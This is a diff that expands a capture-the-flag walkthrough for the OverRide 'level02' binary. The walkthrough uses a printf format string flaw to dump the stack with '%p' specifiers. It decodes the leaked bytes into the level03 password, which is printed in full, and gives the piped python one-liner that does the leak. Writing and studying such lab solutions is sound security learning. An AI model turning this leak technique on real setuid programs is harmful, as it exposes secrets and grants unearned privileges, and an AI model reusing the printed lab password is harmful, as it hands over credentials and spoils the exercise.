@@ -1,25 +1,174 @@
-# Level02 — Walkthrough (short)
+# Level02 — Walkthrough
 
-## Objective
+## Overview
 
-Reach **`printf(line_user)`** with a **format string** in `line_user` (wrong password branch), then **leak** / **write** (e.g. GOT) to get code execution. Success path (`strncmp` OK) gives a shell via `system("/bin/sh")` but requires the real **41-byte** password from `.pass` — the intended student path is usually the **format string** on failure.
+The `level02` binary is a login system that reads a username and a password. It compares the password against the content of `/home/users/level03/.pass`. If the password is wrong, it prints the username using `printf(username)` — a **format string vulnerability**. Since the file password is loaded on the stack before the `printf` call, we can read it directly using `%p` format specifiers.
 
-## VM: no `python3`
+---
 
-Like level01, the OverRide VM often has **`python` / `python2` only**. See **`commands.md`** for working one-liners.
+## Step 1: Run the binary and observe its behavior
 
-## Reproducible command (shape)
+```
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: hello
+--[ Password: wrong
+*****************************************
+hello does not have access!
+```
 
-Pipe **two lines**: username (format payload) + password (wrong). Example **recon** leak:
+The program reads a username and a password, then prints the username on the failure path.
+
+---
+
+## Step 2: Analyze the binary protections
+
+```
+level02@OverRide:~$ ls -la ./level02
+-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
+```
+
+| Protection | Status | Impact |
+|-----------|--------|--------|
+| **Architecture** | x86-64 | 8-byte addresses, registers for first 6 args |
+| **SUID** | level03 | Binary runs with level03 privileges |
+| **NX** | Enabled | Stack not executable |
+| **PIE** | Disabled | Fixed addresses |
+
+---
+
+## Step 3: Identify the vulnerability
+
+From the disassembly, the failure path in `main` does:
+
+```asm
+0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>   ; printf(username)
+```
+
+This is `printf(username)` instead of `printf("%s", username)` — a **format string vulnerability**. We control the format string, so we can inject `%p` specifiers to read values from the stack.
+
+---
+
+## Step 4: Understand the stack layout
+
+From the disassembly, the local variables are:
+
+```
+High addresses
+┌──────────────────────────┐
+│ rbp                      │
+├──────────────────────────┤
+│ FILE*            rbp-0x8 │  8 bytes
+├──────────────────────────┤
+│ bytes_read       rbp-0xc │  4 bytes
+├──────────────────────────┤
+│ username        rbp-0x70 │  100 bytes
+├──────────────────────────┤
+│ file_pass       rbp-0xa0 │  41 bytes
+├──────────────────────────┤
+│ password       rbp-0x110 │  100 bytes
+└──────────────────────────┘
+Low addresses
+```
+
+The key insight: **the file password (`file_pass`) is on the stack**. Since our format string attack reads stack values, we can read the password directly from memory.
+
+---
+
+## Step 5: How printf reads arguments on x86-64
+
+On x86-64, the calling convention passes the first 6 arguments in registers:
+
+| `%p` position | Source |
+|---------------|--------|
+| 1st | rsi |
+| 2nd | rdx |
+| 3rd | rcx |
+| 4th | r8 |
+| 5th | r9 |
+| 6th+ | **stack** |
+
+After the first 5 format specifiers consume the registers, each subsequent `%p` reads the next 8 bytes from the stack.
+
+---
+
+## Step 6: Leak the stack
+
+```
+level02@OverRide:~$ ./level02
+--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+--[ Password: abc
+*****************************************
+0x7fffffffe3e0.(nil).0x61.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe5d8.0x1f7ff9a08.0x636261.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x70252e70252e7025 does not have access!
+```
+
+---
+
+## Step 7: Find the password in the leak
+
+Most values are `(nil)` or recognizable patterns:
+- `0x2a2a2a2a2a2a2a2a` = `"********"` (asterisks from the UI)
+- `0x636261` = `"abc"` (our password input, little-endian)
+
+Then we spot **5 consecutive non-null values** at positions 22–26:
+
+```
+Position 22: 0x756e505234376848
+Position 23: 0x45414a3561733951
+Position 24: 0x377a7143574e6758
+Position 25: 0x354a35686e475873
+Position 26: 0x48336750664b394d
+```
+
+These contain bytes in the ASCII printable range (0x30–0x7a). This is the `file_pass` buffer — the password read from `.pass`. Five values × 8 bytes = 40 bytes, covering the 41-byte password (the last byte is the null terminator).
+
+---
+
+## Step 8: Convert hex to ASCII (little-endian)
+
+On x86-64, multi-byte values are stored little-endian. Each 8-byte value must be reversed byte-by-byte:
+
+| Hex value | Reversed bytes | ASCII |
+|-----------|---------------|-------|
+| `0x756e505234376848` | 48 68 37 34 52 50 6e 75 | `Hh74RPnu` |
+| `0x45414a3561733951` | 51 39 73 61 35 4a 41 45 | `Q9sa5JAE` |
+| `0x377a7143574e6758` | 58 67 4e 57 43 71 7a 37 | `XgNWCqz7` |
+| `0x354a35686e475873` | 73 58 47 6e 68 35 4a 35 | `sXGnh5J5` |
+| `0x48336750664b394d` | 4d 39 4b 66 50 67 33 48 | `M9KfPg3H` |
+
+Concatenated: **`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`**
+
+---
+
+## Step 9: Use the password
+
+```
+level02@OverRide:~$ su level03
+Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+level03@OverRide:~$
+```
+
+---
+
+## Final exploit command
 
 ```bash
 ( python -c "import sys; sys.stdout.write('%p.'*30+'\n'+'wrong\n')" ) | ./level02
 ```
 
-**Success looks like:** a dump of **`0x....`** pointers, then **` does not have access!`** — that is **expected** (wrong-password path + `printf` format leak). It is **not** the final shell exploit.
+Then decode positions 22–26 from the output as described above.
 
-**Do not** leave the literal text `<FORMAT_STRING>` in the command.
+---
 
-The **final** payload (`%n`, GOT addresses, **8-byte** little-endian words on x86-64) belongs in **`commands.md`** after GDB.
+## Key concepts
 
-**“Pas encore” after `%p` dump:** that output **is** a successful first step. Next: find **`POS`** with **`AAAA%POS$p`** (see **`commands.md` § “After recon”**), then GOT **`%n`** writes + libc — until then you will **not** get a shell.
+| Concept | Role in the exploit |
+|---|---|
+| **Format string vulnerability** | `printf(username)` lets us read stack memory using `%p` specifiers |
+| **x86-64 calling convention** | First 5 args in registers, rest on stack — determines the offset to reach `file_pass` |
+| **Little-endian byte order** | 8-byte hex values must be reversed byte-by-byte to recover the ASCII password |
+| **Stack data leakage** | The password from `.pass` is loaded on the stack by `fread` before `printf` is called |
+| **SUID binary** | The program runs as `level03`, which is why it can read `/home/users/level03/.pass` |
